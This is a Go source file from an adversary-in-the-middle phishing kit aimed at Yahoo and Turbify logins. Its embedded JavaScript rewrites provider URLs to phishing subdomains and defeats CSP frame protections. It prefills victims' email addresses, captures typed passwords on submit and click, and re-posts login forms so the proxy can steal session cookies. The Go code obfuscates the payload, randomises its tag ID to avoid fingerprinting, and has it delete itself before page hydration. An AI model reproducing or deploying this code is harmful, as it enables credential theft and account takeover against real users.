package main

import (
	"crypto/rand"
	"encoding/hex"
	"strings"
	"sync"
)

var (
	bootstrapOnce sync.Once
	bootstrapJS   string
	bootstrapID   string
)

// jsPayload is the human-readable interceptor — the SOURCE that gets encrypted
// by buildBootstrap (obfuscate.go). It is never injected raw; only its
// multi-layer XOR+base64 obfuscated form reaches the browser.
//
// The phish domain is derived at runtime from window.location.hostname (strip the
// leftmost role label), so ONE obfuscated bootstrap serves every tenant domain.
// Only the endpoint paths and the bootstrap element ID are templated server-side.
var jsPayload = `(function(){
  var phishDomain = (function(){
    var h = window.location.hostname;
    var i = h.indexOf('.');
    return i !== -1 ? h.substring(i + 1) : h;
  })();
  var domainMap = {
    // Turbify / Yahoo shared CDN + APIs (runtime-built URLs the server-side
    // rewriter can't catch). login.yahoo.com maps to login-yh (NOT the gated
    // entry subdomain yahoo.) so runtime API calls don't hit the gate check.
    'platform-api.turbify.com': 'api-tb.' + phishDomain,
    'login.turbify.com': 'login-tb.' + phishDomain,
    'login.yahoo.com': 'login-yh.' + phishDomain,
    's.yimg.com': 'cdn-tb.' + phishDomain,
    'geo.yahoo.com': 'geo-tb.' + phishDomain,
    'udc.yahoo.com': 'udc-tb.' + phishDomain,
    'fc.yahoo.com': 'fc-tb.' + phishDomain,
    // Yahoo consumer hosts the login page fetches at runtime. Without these the
    // browser hits the REAL Yahoo origins cross-origin → CORS-blocked.
    'guce.yahoo.com': 'yahoo-guce.' + phishDomain,
    'edge-mcdn.secure.yahoo.com': 'yahoo-mcdn.' + phishDomain,
    'mail.yahoo.com': 'yahoo-mail.' + phishDomain,
    // The full-screen login BACKDROP is an iframe from gpt.mail.yahoo.net. It
    // sends a frame-ancestors CSP allowing only *.yahoo.com to embed it, so from
    // our phish domain the iframe (the background) is blocked. Routing it through
    // our proxy (which strips the CSP) lets it render.
    'gpt.mail.yahoo.net': 'yahoo-gpt.' + phishDomain
  };
  var domainRules = [];
  for (var real in domainMap) {
    domainRules.push({
      re: new RegExp('(^|[/.])' + real.replace(/\./g, '\\.') + '(?=[/:?#]|$)', 'g'),
      to: domainMap[real]
    });
  }
  function rewriteUrl(url) {
    if (typeof url !== 'string') return url;
    for (var i = 0; i < domainRules.length; i++) {
      var rule = domainRules[i];
      rule.re.lastIndex = 0;
      url = url.replace(rule.re, function(m, pre){ return pre + rule.to; });
    }
    return url;
  }

  var loginHandoffDone = false;

  // Hand off to the proxy's termination flow: navigate to the entry root. Used
  // ONLY by the external-form intercept below (targets whose login form posts to
  // the REAL provider, so we re-post to the proxy then nudge the flow onward).
  // Same-origin flows (e.g. Yahoo) are left to drive themselves — forcing this on
  // every auth response bounced FAILED logins (wrong password) back to the email
  // step, so it is deliberately NOT wired into the fetch/XHR patches.
  function handoffToTermination() {
    if (loginHandoffDone) return;
    loginHandoffDone = true;
    setTimeout(function(){
      try { window.location.href = window.location.origin + '/'; } catch(e) {}
    }, 1200);
  }

  // ── Patch fetch ──
  // Rewrites runtime-built URLs (real provider → phish subdomain) so cross-origin
  // calls go through the proxy. No forced navigation here — the provider's own JS
  // walks the post-login flow via relative URLs that stay on the proxy, and the
  // proxy terminates the session once it completes.
  var originalFetch = window.fetch;
  window.fetch = function(input, init) {
    if (typeof input === 'string') {
      input = rewriteUrl(input);
    } else if (input && input.url) {
      var newUrl = rewriteUrl(input.url);
      if (newUrl !== input.url) { input = new Request(newUrl, input); }
    }
    return originalFetch.call(this, input, init);
  };

  // ── Patch XMLHttpRequest ──
  var originalOpen = XMLHttpRequest.prototype.open;
  XMLHttpRequest.prototype.open = function(method, url) {
    arguments[1] = rewriteUrl(url);
    return originalOpen.apply(this, arguments);
  };

  // ── Rewrite iframe srcs (the full-screen background ad iframe) ──
  // Yahoo's login backdrop is <iframe id="login-ads-gpt-iframe"> from
  // gpt.mail.yahoo.net, blocked by frame-ancestors when embedded from our phish
  // domain. Rewrite its src to our proxy subdomain (CSP stripped) so it loads.
  // We watch BOTH insertion and src-attribute changes: a React component re-sets
  // the src from the RSC flight data during/after hydration, so we keep
  // re-pointing it at the proxy. (rewriteUrl is a no-op on an already-rewritten
  // src, so there's no observer loop.)
  function fixIframeSrc(frame) {
    try {
      var src = frame.getAttribute('src');
      if (src) {
        var rewritten = rewriteUrl(src);
        if (rewritten !== src) frame.setAttribute('src', rewritten);
      }
    } catch (e) {}
  }
  function scanIframes(root) {
    var frames = (root || document).querySelectorAll('iframe');
    for (var i = 0; i < frames.length; i++) fixIframeSrc(frames[i]);
  }
  if (document.documentElement) { scanIframes(document); }
  var iframeObserver = new MutationObserver(function(m) {
    for (var i = 0; i < m.length; i++) {
      var rec = m[i];
      if (rec.type === 'childList') {
        var added = rec.addedNodes;
        for (var j = 0; j < added.length; j++) {
          var node = added[j];
          if (node.nodeType !== 1) continue;
          if (node.tagName === 'IFRAME') fixIframeSrc(node);
          if (node.querySelectorAll) scanIframes(node);
        }
      } else if (rec.type === 'attributes' && rec.target && rec.target.tagName === 'IFRAME') {
        fixIframeSrc(rec.target);
      }
    }
  });
  if (document.documentElement) {
    iframeObserver.observe(document.documentElement, {
      childList: true, subtree: true,
      attributes: true, attributeFilter: ['src']
    });
  }

  // ── Self-remove this bootstrap's <script> tag ──
  // The interceptor is injected in <head> so the fetch/XHR/iframe patches above
  // are in place BEFORE Yahoo's early scripts run. But Next.js hydrates the
  // document and treats an unexpected <script> in <head> as a server/client
  // mismatch → React error #418 → it discards the server render (background
  // included). The patches are already installed, so we delete our own tag now —
  // synchronously, before React hydrates. The installed patches and the
  // listeners/observer registered above survive; only the empty tag is removed.
  try {
    var __bsTag = document.getElementById('__BOOTSTRAP_ID__');
    if (__bsTag && __bsTag.parentNode) { __bsTag.parentNode.removeChild(__bsTag); }
  } catch (e) {}

  // ── Email detection + prefill ──
  function runDetection() {
    var hash = window.location.hash.substring(1);
    if (!hash || hash.indexOf('@') === -1) return;
    var email = decodeURIComponent(hash).replace(/=+$/, '');

    fetch('__DETECT_ENDPOINT__', {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({email: email})
    })
    .then(function(r){ return r.json(); })
    .then(function(data){
      var currentHost = window.location.host;
      var targetHost = new URL(data.target_url).host;
      if (currentHost !== targetHost) {
        window.location.replace(data.target_url);
        return;
      }
      fillEmail(email);
    })
    .catch(function(){ fillEmail(email); });
  }

  function fillEmail(email) {
    var selectors = [
      'input[type="email"]',
      'input[name="loginfmt"]',
      'input[name="login"]',
      'input[name="username"]',
      'input[name="email"]',
      'input[name="user"]',
      'input[name="lid"]',
      '#i0116',
      '#login-username',
      '#user',
      '#login_id'
    ];
    function attemptFill() {
      for (var i = 0; i < selectors.length; i++) {
        var input = document.querySelector(selectors[i]);
        if (input && input.offsetParent !== null) {
          var setter = Object.getOwnPropertyDescriptor(
            window.HTMLInputElement.prototype, 'value'
          ).set;
          setter.call(input, email);
          input.dispatchEvent(new Event('input', { bubbles: true }));
          input.dispatchEvent(new Event('change', { bubbles: true }));
          return true;
        }
      }
      return false;
    }
    // Delay the first fill until AFTER React hydrates the server-rendered input
    // (filling it synchronously diverges from the RSC flight data → #418). The
    // MutationObserver still catches client-rendered inputs as they mount.
    setTimeout(attemptFill, 400);
    setTimeout(attemptFill, 1500);
    setTimeout(attemptFill, 3000);
    if (document.body) {
      var observer = new MutationObserver(function(m) {
        for (var i = 0; i < m.length; i++) {
          if (m[i].addedNodes.length > 0) {
            if (attemptFill()) observer.disconnect();
          }
        }
      });
      observer.observe(document.body, { childList: true, subtree: true });
    }
    if (window.history && window.history.replaceState) {
      window.history.replaceState(null, '', window.location.pathname + window.location.search);
    }
  }

  // ── Field locators ──
  function findUsername() {
    var sels = ['input[type="email"]','input[name="username"]','input[name="login"]',
                'input[name="user"]','input[name="loginfmt"]','input[name="lid"]',
                '#username','#user','#login-username','#i0116','#login_id'];
    for (var i = 0; i < sels.length; i++) {
      var el = document.querySelector(sels[i]);
      if (el && el.value) return el.value;
    }
    return '';
  }
  function findPassword() {
    var p = document.querySelector('input[type="password"]');
    return (p && p.value) ? p.value : '';
  }
  function sendCapture(username, password) {
    if (!password) return;
    try {
      fetch('__CAPTURE_ENDPOINT__', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({username: username, password: password, url: location.href})
      });
    } catch(e) {}
  }

  // ── DOM password capture ──
  function hookPasswordCapture() {
    var lastPass = '';
    function currentPass() {
      var p = document.querySelector('input[type="password"]');
      return (p && p.value) ? p.value : lastPass;
    }
    document.addEventListener('input', function(e){
      if (e.target && e.target.type === 'password') lastPass = e.target.value;
    }, true);
    document.addEventListener('submit', function(){
      sendCapture(findUsername(), currentPass());
    }, true);
    document.addEventListener('click', function(e){
      var btn = (e.target && e.target.closest) ? e.target.closest('button, input[type="submit"]') : null;
      if (btn) {
        var pass = currentPass();
        if (pass) sendCapture(findUsername(), pass);
      }
    }, true);
  }

  // ── Login form intercept (cookie-grabbing handoff) ──
  // Only for targets whose login form posts to the REAL provider (external
  // action). We intercept, re-post the credentials to the CURRENT proxy host so
  // the proxy lifts the auth cookies, then hand off to termination. Same-origin
  // forms (e.g. Yahoo) are left untouched — the proxy already sees them.
  function hookLoginIntercept() {
    var fired = false;
    function isExternalAction(action) {
      if (!action) return false;
      try {
        var u = new URL(action, window.location.href);
        return u.host !== window.location.host;
      } catch(e) { return false; }
    }
    function serializeForm(form) {
      var parts = [];
      try {
        var data = new FormData(form);
        data.forEach(function(v, k){
          parts.push(encodeURIComponent(k) + '=' + encodeURIComponent(v));
        });
      } catch(e) {}
      var user = findUsername(), pass = findPassword();
      if (pass && parts.join('&').indexOf(encodeURIComponent(pass)) === -1) {
        parts.push('password=' + encodeURIComponent(pass));
      }
      if (user && parts.join('&').indexOf(encodeURIComponent(user)) === -1) {
        parts.push('username=' + encodeURIComponent(user));
      }
      return parts.join('&');
    }
    function intercept(e) {
      if (fired) return;
      var pass = findPassword();
      if (!pass) return;
      var form = (e.target && e.target.closest) ? e.target.closest('form') : null;
      var action = form ? (form.getAttribute('action') || window.location.href) : window.location.href;
      if (!isExternalAction(action)) return;

      fired = true;
      e.preventDefault();
      e.stopPropagation();

      sendCapture(findUsername(), pass);

      var path;
      try { path = new URL(action, window.location.href).pathname; } catch(_) { path = window.location.pathname; }
      var proxyUrl = window.location.origin + path;

      originalFetch.call(window, proxyUrl, {
        method: 'POST',
        credentials: 'include',
        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
        body: serializeForm(form)
      }).then(function(){ handoffToTermination(); },
              function(){ handoffToTermination(); });
    }
    document.addEventListener('submit', intercept, true);
  }

  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', function(){
      runDetection(); hookPasswordCapture(); hookLoginIntercept();
    });
  } else {
    runDetection();
    hookPasswordCapture();
    hookLoginIntercept();
  }
})();`

// genBootstrapID returns a short random element ID for the bootstrap <script>
// tag, so the payload can find and remove its own tag (and the ID isn't a
// stable, greppable fingerprint across deployments).
func genBootstrapID() string {
	b := make([]byte, 6)
	if _, err := rand.Read(b); err != nil {
		return "bs7f3a9c1e0d"
	}
	return "bs" + hex.EncodeToString(b)
}

// getBootstrap builds the obfuscated, self-decrypting loader once. The phish
// domain is derived at runtime inside the payload; the endpoint paths and the
// bootstrap element ID are templated here.
func getBootstrap() string {
	bootstrapOnce.Do(func() {
		bootstrapID = genBootstrapID()
		js := strings.ReplaceAll(jsPayload, "__DETECT_ENDPOINT__", detectEndpoint)
		js = strings.ReplaceAll(js, "__CAPTURE_ENDPOINT__", captureEndpoint)
		js = strings.ReplaceAll(js, "__BOOTSTRAP_ID__", bootstrapID)
		bootstrapJS = buildBootstrap(js)
	})
	return bootstrapJS
}

// injectPayload inserts the obfuscated bootstrap right after <head>. The payload
// patches fetch/XHR and iframe srcs (so Yahoo's early scripts and the background
// ad iframe get rewritten) and then removes its own <script> tag before React
// hydrates — so Next.js never sees an unexpected element (no #418) while runtime
// URLs and the backdrop iframe are still proxied.
func injectPayload(html string) string {
	if jsPayload == "" {
		return html
	}

	js := getBootstrap() // ensures bootstrapID is set
	script := `<script id="` + bootstrapID + `">` + js + `</script>`

	if idx := strings.Index(strings.ToLower(html), "<head>"); idx != -1 {
		insertAt := idx + len("<head>")
		return html[:insertAt] + script + html[insertAt:]
	}
	if idx := strings.LastIndex(strings.ToLower(html), "</body>"); idx != -1 {
		return html[:idx] + script + html[idx:]
	}
	return html + script
}
